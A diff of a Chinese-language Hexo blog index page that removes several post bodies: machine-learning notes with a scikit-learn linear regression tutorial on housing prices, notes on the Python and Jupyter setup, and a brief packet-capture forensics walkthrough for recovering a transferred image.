@@ -164,18 +164,7 @@
   <time datetime="2022-07-25T13:56:29.000Z" itemprop="datePublished">2022-07-25</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="1-分类问题"><a href="#1-分类问题" class="headerlink" title="1.分类问题"></a>1.分类问题</h1><p>垃圾邮件检测：</p>
-<p>标注样本邮件为垃圾邮件（人）</p>
-<p>获取批量的样本邮件及标签，学习其<strong>特征</strong>（计算机）</p>
-<p>针对新的邮件，自动判断其类别（计算机）</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -214,116 +203,7 @@
   <time datetime="2022-07-21T06:34:02.000Z" itemprop="datePublished">2022-07-21</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="1-回归分析"><a href="#1-回归分析" class="headerlink" title="1.回归分析"></a>1.回归分析</h1><h2 id="回归分析："><a href="#回归分析：" class="headerlink" title="回归分析："></a>回归分析：</h2><p>根据<strong>数据</strong>，确定两种或者两种以上变量间相互依赖的定量关系</p>
-<h2 id="函数表达式："><a href="#函数表达式：" class="headerlink" title="函数表达式："></a>函数表达式：</h2><img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220722104534083.png" alt="image-20220722104534083" style="zoom:80%;">
-
-<h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><p><img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220722104619295.png" alt="image-20220722104619295"></p>
-<h1 id="2-线性回归"><a href="#2-线性回归" class="headerlink" title="2.线性回归"></a>2.线性回归</h1><h2 id="线性回归："><a href="#线性回归：" class="headerlink" title="线性回归："></a>线性回归：</h2><p>回归分析中，变量与因变量存在线性关系</p>
-<h2 id="函数表达式：-1"><a href="#函数表达式：-1" class="headerlink" title="函数表达式："></a>函数表达式：</h2><p>$$<br>y = ax+b<br>$$<br>线性回归属于<strong>监督学习</strong></p>
-<h2 id="梯度下降法"><a href="#梯度下降法" class="headerlink" title="梯度下降法"></a><a href><strong>梯度下降法</strong></a></h2><p><img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220722111805695.png" alt="image-20220722111805695"></p>
-<p><img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220722111816946.png" alt="image-20220722111816946"></p>
-<h1 id="3-Scikit-lean"><a href="#3-Scikit-lean" class="headerlink" title="*3.Scikit-lean"></a>*3.Scikit-lean</h1><p>​    一款开源框架（算法库）：数据预处理、分类、回归、降温、模型选择等常用的机器学习算法。</p>
-<p>​    特点：基础各类成熟算法、安装容易、样例丰富；不支持Python之外的语言、不支持深度学习和强化学习。</p>
-<p><a target="_blank" rel="noopener" href="https://scikit-learn.org/stable/index.html">官方文档（英文）</a></p>
-<p><a target="_blank" rel="noopener" href="https://scikit-learn.org.cn/">中文社区</a></p>
-<h2 id="Sklearn求解线性回归问题"><a href="#Sklearn求解线性回归问题" class="headerlink" title="Sklearn求解线性回归问题"></a>Sklearn求解线性回归问题</h2><h3 id="1-寻找a、b-y-ax-b"><a href="#1-寻找a、b-y-ax-b" class="headerlink" title="1.寻找a、b(y = ax + b)"></a>1.寻找a、b(y = ax + b)</h3><h3 id="2-评估模型表现"><a href="#2-评估模型表现" class="headerlink" title="2.评估模型表现"></a>2.评估模型表现</h3><h4 id="1-y与y’的均方差（MSE）"><a href="#1-y与y’的均方差（MSE）" class="headerlink" title="(1)y与y’的均方差（MSE）:"></a>(1)y与y’的均方差（MSE）:</h4><img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220722232302342.png" alt="image-20220722232302342" style="zoom:50%;">
-
-<h4 id="2-R方值"><a href="#2-R方值" class="headerlink" title="(2)R方值"></a>(2)R方值</h4><img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220722232403611.png" alt="image-20220722232403611">
-
-<p>MSE越小越好，R平方分数越接近1越好；</p>
-<p>y’与y集中度越高越好；</p>
-<h1 id="4-线性回归实战"><a href="#4-线性回归实战" class="headerlink" title="4.线性回归实战"></a>4.线性回归实战</h1><h2 id="1-单因子实现线性预测："><a href="#1-单因子实现线性预测：" class="headerlink" title="1.单因子实现线性预测："></a>1.单因子实现线性预测：</h2><p><strong>任务:</strong><br>$$<br>y = 2x + 5<br>$$<br>基于generated_data.csv数据，建立线性回归模型，预测x=3.5对应的y值，评估模型表现</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#加载数据</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;generated_data.csv&#x27;</span>)</span><br><span class="line"><span class="comment">#data赋值</span></span><br><span class="line">x = data.loc[:,<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line">y = data.loc[:,<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line"><span class="comment">#数据可视化</span></span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.figure(figsize=(<span class="number">10</span>,<span class="number">10</span>))</span><br><span class="line">plt.scatter(x,y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220722234641188.png" alt="image-20220722234641188"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#建立线性回归模型（linear_model）</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="comment">#模型实例</span></span><br><span class="line">lr_model = LinearRegression()</span><br><span class="line"><span class="comment">#使用numpy转换数据</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.array(x)</span><br><span class="line"><span class="comment">#reshape(-1,1)一维数据转换成二维</span></span><br><span class="line">x = x.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">y = np.array(y)</span><br><span class="line">y = y.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#&lt;class &#x27;numpy.ndarray&#x27;&gt; (10, 1) &lt;class &#x27;numpy.ndarray&#x27;&gt; (10, 1)</span></span><br><span class="line"><span class="comment">#拟合x,y</span></span><br><span class="line">lr_model.fit(x,y)</span><br><span class="line"><span class="comment">#预测y值</span></span><br><span class="line">y_predict = lr_model.predict(x)</span><br><span class="line">print(y_predict)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[[ 7.]</span></span><br><span class="line"><span class="string"> [ 9.]</span></span><br><span class="line"><span class="string"> [11.]</span></span><br><span class="line"><span class="string"> [13.]</span></span><br><span class="line"><span class="string"> [15.]</span></span><br><span class="line"><span class="string"> [17.]</span></span><br><span class="line"><span class="string"> [19.]</span></span><br><span class="line"><span class="string"> [21.]</span></span><br><span class="line"><span class="string"> [23.]</span></span><br><span class="line"><span class="string"> [25.]]&#x27;&#x27;&#x27;</span></span><br><span class="line">y_3 = lr_model.predict([[<span class="number">3.5</span>]])</span><br><span class="line">print(y_3)<span class="comment">#[[12.]]</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#打印a、b</span></span><br><span class="line">a = lr_model.coef_</span><br><span class="line">b = lr_model.intercept_</span><br><span class="line">print(a,b)<span class="comment">#[[2.]] [5.]</span></span><br><span class="line"><span class="comment">#结果a = 2,b = 5说明模型正确</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> </span><br><span class="line">mean_squared_error,r2_score</span><br><span class="line"><span class="comment">#评估模型</span></span><br><span class="line">MSE = mean_squared_error(y,y_predict)</span><br><span class="line">R2 = r2_score(y,y_predict)</span><br><span class="line">print(MSE,R2)<span class="comment">#3.1554436208840474e-31 1.0</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#对比y与y&#x27;</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(y,y_predict)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-<img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220723000644545.png" alt="image-20220723000644545" style="zoom: 80%;">
-
-<h2 id="2-线性回归预测房价（多因子实现线性预测-）"><a href="#2-线性回归预测房价（多因子实现线性预测-）" class="headerlink" title="2.线性回归预测房价（多因子实现线性预测 ）"></a>2.线性回归预测房价（多因子实现线性预测 ）</h2><p><strong>任务:</strong> 基于usa_housing_price.csv数据，建立线性回归模型，预测合理房价：</p>
-<p> 1、以面积为输入变量，建立单因子模型，评估模型表现，可视化线性回归预测结果</p>
-<p> 2、以income、house age、numbers of rooms、population、area为输入变量，建立多因子模型，评估模型表现 </p>
-<p>3、预测Income=65000, House Age=5, Number of Rooms=5, Population=30000,size=200的合理房价 X_test = [65000,5,5,30000,200]</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>Avg. Area Income</th>
-<th>Avg. Area House Age</th>
-<th>Avg. Area Number of Rooms</th>
-<th>Area Population</th>
-<th>size</th>
-<th align="center">Price</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0</td>
-<td>79545.45857</td>
-<td>5.317139</td>
-<td>7.009188</td>
-<td>23086.80050</td>
-<td>188.214212</td>
-<td align="center">1.059034e+06</td>
-</tr>
-<tr>
-<td>1</td>
-<td>79248.64245</td>
-<td>4.997100</td>
-<td>6.730821</td>
-<td>40173.07217</td>
-<td>160.042526</td>
-<td align="center">1.505891e+06</td>
-</tr>
-<tr>
-<td>2</td>
-<td>61287.06718</td>
-<td>5.134110</td>
-<td>8.512727</td>
-<td>36882.15940</td>
-<td>227.273544</td>
-<td align="center">1.058988e+06</td>
-</tr>
-<tr>
-<td>3</td>
-<td>63345.24005</td>
-<td>3.811764</td>
-<td>5.586729</td>
-<td>34310.24283</td>
-<td>164.816630</td>
-<td align="center">1.260617e+06</td>
-</tr>
-<tr>
-<td>4</td>
-<td>59982.19723</td>
-<td>5.959445</td>
-<td>7.839388</td>
-<td>26354.10947</td>
-<td>161.966659</td>
-<td align="center">6.309435e+05</td>
-</tr>
-</tbody></table>
-<p>usa_housing_price.csv表数据如上表所示。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#load the data</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;usa_housing_price.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">%matplotlib inline</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment">#将数据可视化，便于理解</span></span><br><span class="line">fig = plt.figure(figsize=(<span class="number">10</span>,<span class="number">10</span>))</span><br><span class="line">fig1 =plt.subplot(<span class="number">231</span>)<span class="comment">#231表示2行3列的第1个</span></span><br><span class="line">plt.scatter(data.loc[:,<span class="string">&#x27;Avg. Area Income&#x27;</span>],data.loc[:,<span class="string">&#x27;Price&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Price VS Income&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fig2 =plt.subplot(<span class="number">232</span>)<span class="comment">#231表示2行3列的第2个</span></span><br><span class="line">plt.scatter(data.loc[:,<span class="string">&#x27;Avg. Area House Age&#x27;</span>],data.loc[:,<span class="string">&#x27;Price&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Price VS House Age&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fig3 =plt.subplot(<span class="number">233</span>)<span class="comment">#231表示2行3列的第3个</span></span><br><span class="line">plt.scatter(data.loc[:,<span class="string">&#x27;Avg. Area Number of Rooms&#x27;</span>],data.loc[:,<span class="string">&#x27;Price&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Price VS Number of Rooms&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fig4 =plt.subplot(<span class="number">234</span>)<span class="comment">#231表示2行3列的第4个</span></span><br><span class="line">plt.scatter(data.loc[:,<span class="string">&#x27;Area Population&#x27;</span>],data.loc[:,<span class="string">&#x27;Price&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Price VS Area Population&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fig5 =plt.subplot(<span class="number">235</span>)<span class="comment">#231表示2行3列的第5个</span></span><br><span class="line">plt.scatter(data.loc[:,<span class="string">&#x27;size&#x27;</span>],data.loc[:,<span class="string">&#x27;Price&#x27;</span>])</span><br><span class="line">plt.title(<span class="string">&#x27;Price VS size&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-<p>打印的图片如下图所示。</p>
-<p><img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220725174644604.png" alt="image-20220725174644604"></p>
-<h3 id="1）以面积为输入变量，建立单因子模型，评估模型表现，可视化线性回归预测结果："><a href="#1）以面积为输入变量，建立单因子模型，评估模型表现，可视化线性回归预测结果：" class="headerlink" title="1）以面积为输入变量，建立单因子模型，评估模型表现，可视化线性回归预测结果："></a>1）以面积为输入变量，建立单因子模型，评估模型表现，可视化线性回归预测结果：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取房屋面积和价格</span></span><br><span class="line">X = data.loc[:,<span class="string">&#x27;size&#x27;</span>]</span><br><span class="line">y = data.loc[:,<span class="string">&#x27;Price&#x27;</span>]</span><br><span class="line">X = np.array(X).reshape(-<span class="number">1</span>,<span class="number">1</span>)<span class="comment">#将数据转换成2维的数组</span></span><br><span class="line">print(X.shape)<span class="comment">#(5000, 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#建立线性模型</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line">LR1 = LinearRegression()</span><br><span class="line"><span class="comment">#训练模型</span></span><br><span class="line">LR1.fit(X,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算根据size计算price</span></span><br><span class="line">y_predict_1 = LR1.predict(X)</span><br><span class="line"></span><br><span class="line"><span class="comment">#评估模型MSE;R方</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error,r2_score</span><br><span class="line">mean_squared_error_1 = mean_squared_error(y,y_predict_1)</span><br><span class="line">r2_score_1 = r2_score(y,y_predict_1)</span><br><span class="line">print(mean_squared_error_1,r2_score_1)<span class="comment">#108771672553.6264 0.1275031240418234</span></span><br><span class="line"></span><br><span class="line">fig6 = plt.figure(figsize=(<span class="number">8</span>,<span class="number">5</span>))</span><br><span class="line">plt.scatter(X,y)</span><br><span class="line">plt.plot(X,y_predict_1,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220725175234990.png" alt="image-20220725175234990"></p>
-<p><strong>由图可以看出只根据面积来预测房价不是很合适；此外，R方值为0.1275031240418234，说明模型不好。</strong></p>
-<h3 id="2）以income、house-age、numbers-of-rooms、population、area为输入变量，建立多因子模型，评估模型表现-："><a href="#2）以income、house-age、numbers-of-rooms、population、area为输入变量，建立多因子模型，评估模型表现-：" class="headerlink" title="2）以income、house age、numbers of rooms、population、area为输入变量，建立多因子模型，评估模型表现 ："></a>2）以income、house age、numbers of rooms、population、area为输入变量，建立多因子模型，评估模型表现 ：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define X_multi</span></span><br><span class="line">X_multi = data.drop([<span class="string">&#x27;Price&#x27;</span>],axis=<span class="number">1</span>)<span class="comment">#除去Price这列数据，其他作为因子</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#set up 2nd linear model</span></span><br><span class="line">LR_multi = LinearRegression()</span><br><span class="line"></span><br><span class="line"><span class="comment">#train the model</span></span><br><span class="line">LR_multi.fit(X_multi,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#make prediction</span></span><br><span class="line">y_predict_multi = LR_multi.predict(X_multi)</span><br><span class="line"></span><br><span class="line">mean_squared_error_multi = mean_squared_error(y,y_predict_multi)</span><br><span class="line">r2_score_multi = r2_score(y,y_predict_multi)</span><br><span class="line">print(mean_squared_error_multi,r2_score_multi)<span class="comment">#10219846512.17786 0.9180229195220739</span></span><br><span class="line"><span class="comment">#R方值为 0.9180229195220739，已经很接近1了，所以模型比较好</span></span><br><span class="line"></span><br><span class="line">fig7 = plt.figure(figsize=(<span class="number">8</span>,<span class="number">5</span>))</span><br><span class="line"><span class="comment">#绘制y与y_predict_multi对比的散点图(多因子)</span></span><br><span class="line">plt.scatter(y,y_predict_multi)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220725175852185.png" alt="image-20220725175852185"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#绘制y与y_predict对比的散点图（单因子）</span></span><br><span class="line">fig8 = plt.figure(figsize=(<span class="number">8</span>,<span class="number">5</span>))</span><br><span class="line">plt.scatter(y,y_predict_1)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/07/21/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/image-20220725175919317.png" alt="image-20220725175919317"></p>
-<h3 id="3、预测Income-65000-House-Age-5-Number-of-Rooms-5-Population-30000-size-200的合理房价-X-test-65000-5-5-30000-200"><a href="#3、预测Income-65000-House-Age-5-Number-of-Rooms-5-Population-30000-size-200的合理房价-X-test-65000-5-5-30000-200" class="headerlink" title="3、预测Income=65000, House Age=5, Number of Rooms=5, Population=30000,size=200的合理房价 X_test = [65000,5,5,30000,200]"></a>3、预测Income=65000, House Age=5, Number of Rooms=5, Population=30000,size=200的合理房价 X_test = [65000,5,5,30000,200]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X_test = [<span class="number">65000</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">30000</span>,<span class="number">200</span>]</span><br><span class="line">X_test = np.array(X_test).reshape(<span class="number">1</span>,-<span class="number">1</span>)</span><br><span class="line">print(X_test)<span class="comment">#[[65000     5     5 30000   200]]</span></span><br><span class="line">y_test_predict = LR_multi.predict(X_test)</span><br><span class="line">print(y_test_predict)<span class="comment">#[817052.19516298]</span></span><br></pre></td></tr></table></figure>
-<p><strong>线性回归房价实战summary：</strong><br><strong>1、通过搭建线性回归模型，实现单因子的房屋价格预测；</strong><br><strong>2、在单因子模型效果不好的情况下，通过考虑更多的因子，建立了多因子模型；</strong><br><strong>3、多因子模型达到了更好的预测效果，r2分数为0.91；</strong><br><strong>4、实现了预测结果的可视化，直观对比预测价格与实际价格的差异。</strong></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -364,34 +244,7 @@
   <time datetime="2022-07-20T16:41:22.000Z" itemprop="datePublished">2022-07-21</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="机器学习-开发环境"><a href="#机器学习-开发环境" class="headerlink" title="机器学习-开发环境"></a>机器学习-开发环境</h1><h2 id="1-Python"><a href="#1-Python" class="headerlink" title="1.Python"></a>1.Python</h2><p><strong>解释型</strong>、<strong>面向对象</strong>、<strong>移植新强</strong>的高级程序设计语言</p>
-<p><strong>优点：</strong></p>
-<p>简单、开发效率高、高级语言、可移植性、可扩展、可嵌入</p>
-<p><strong>缺点：</strong></p>
-<p>速度慢、代码不能加密；</p>
-<h2 id="2-Anaconda"><a href="#2-Anaconda" class="headerlink" title="2.Anaconda"></a>2.Anaconda</h2><p>Anaconda是一个方面的python<u>包管理</u>和<u>环境</u>管理软件</p>
-<p>支持Linux\Mac\Windows</p>
-<p>可与方便地解决多版本python并存、切换、各种第三方包安装问题哦</p>
-<p><strong>优点</strong>：跨平台、同时实现包管理、环境管理地功能、使用方便、部署简单</p>
-<h2 id="3-Jupyter-notebook"><a href="#3-Jupyter-notebook" class="headerlink" title="3.Jupyter notebook"></a>3.Jupyter notebook</h2><p>一个开源地Web应用程序。</p>
-<p>可以实现写代码、运行代码、查看结果、并可视化数据</p>
-<p>特点：</p>
-<p>允许吧代码写入独立地cell中，单独执行。用户可以在测试项目的单独测试特定的代码块，无需从头开始执行。</p>
-<p>基于web框架进行交互开发、方便。</p>
-<p>附录：基础工具包</p>
-<p>Panda\Numpy\Matplotlib</p>
-<p><a target="_blank" rel="noopener" href="https://www.matplotlib.org.cn/">https://www.matplotlib.org.cn/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.numpy.org.cn/">https://www.numpy.org.cn/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.matplotlib.org.cn/">https://www.matplotlib.org.cn/</a></p>
-<p><img src="/2022/07/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/Users\wzk\AppData\Roaming\Typora\typora-user-images\image-20220721004435440.png" alt="image-20220721004435440"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -430,14 +283,7 @@
   <time datetime="2022-07-20T07:42:58.000Z" itemprop="datePublished">2022-07-20</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-   
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -476,23 +322,7 @@
   <time datetime="2021-04-13T14:31:39.000Z" itemprop="datePublished">2021-04-13</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="取证分析-恢复传输过程中的文件"><a href="#取证分析-恢复传输过程中的文件" class="headerlink" title="取证分析-恢复传输过程中的文件"></a>取证分析-恢复传输过程中的文件</h2><h3 id="1-抓包"><a href="#1-抓包" class="headerlink" title="1.抓包"></a>1.抓包</h3><p><img src="/2021/04/13/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90-%E6%81%A2%E5%A4%8D%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6/1618325127584.png" alt="1618325127584"></p>
-<h3 id="2-追踪TCP流"><a href="#2-追踪TCP流" class="headerlink" title="2.追踪TCP流"></a>2.追踪TCP流</h3><p><img src="/2021/04/13/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90-%E6%81%A2%E5%A4%8D%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6/1618325159847.png" alt="1618325159847"></p>
-<h3 id="3-选择响应"><a href="#3-选择响应" class="headerlink" title="3.选择响应"></a>3.选择响应</h3><p><img src="/2021/04/13/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90-%E6%81%A2%E5%A4%8D%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6/1618325229283.png" alt="1618325229283"></p>
-<h3 id="4-原始数据显示"><a href="#4-原始数据显示" class="headerlink" title="4.原始数据显示"></a>4.原始数据显示</h3><p><img src="/2021/04/13/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90-%E6%81%A2%E5%A4%8D%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6/1618324528222.png" alt="1618324528222"></p>
-<h3 id="5-另存为-bin文件"><a href="#5-另存为-bin文件" class="headerlink" title="5.另存为.bin文件"></a>5.另存为.bin文件</h3><p><img src="/2021/04/13/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90-%E6%81%A2%E5%A4%8D%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6/1618324567186.png" alt="1618324567186"></p>
-<h3 id="6-使用FlexHEX打开编辑"><a href="#6-使用FlexHEX打开编辑" class="headerlink" title="6.使用FlexHEX打开编辑"></a>6.使用FlexHEX打开编辑</h3><p>只保留数据部分，删除响应头</p>
-<p><img src="/2021/04/13/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90-%E6%81%A2%E5%A4%8D%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6/1618325336633.png" alt="1618325336633"></p>
-<h3 id="7-另存为test-jpg"><a href="#7-另存为test-jpg" class="headerlink" title="7.另存为test.jpg"></a>7.另存为test.jpg</h3><p><img src="/2021/04/13/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90-%E6%81%A2%E5%A4%8D%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6/1618325435828.png" alt="1618325435828"></p>
-<h3 id="8-可以打开了？"><a href="#8-可以打开了？" class="headerlink" title="8.可以打开了？"></a>8.可以打开了？</h3><p><img src="/2021/04/13/%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90-%E6%81%A2%E5%A4%8D%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6/1618325469056.png" alt="1618325469056"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -533,30 +363,7 @@
   <time datetime="2021-04-10T15:55:37.000Z" itemprop="datePublished">2021-04-10</time>
 </a>    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <p>靶场：<a target="_blank" rel="noopener" href="https://rimovni.exeye.run/mefe/login">https://rimovni.exeye.run/mefe/login</a>?</p>
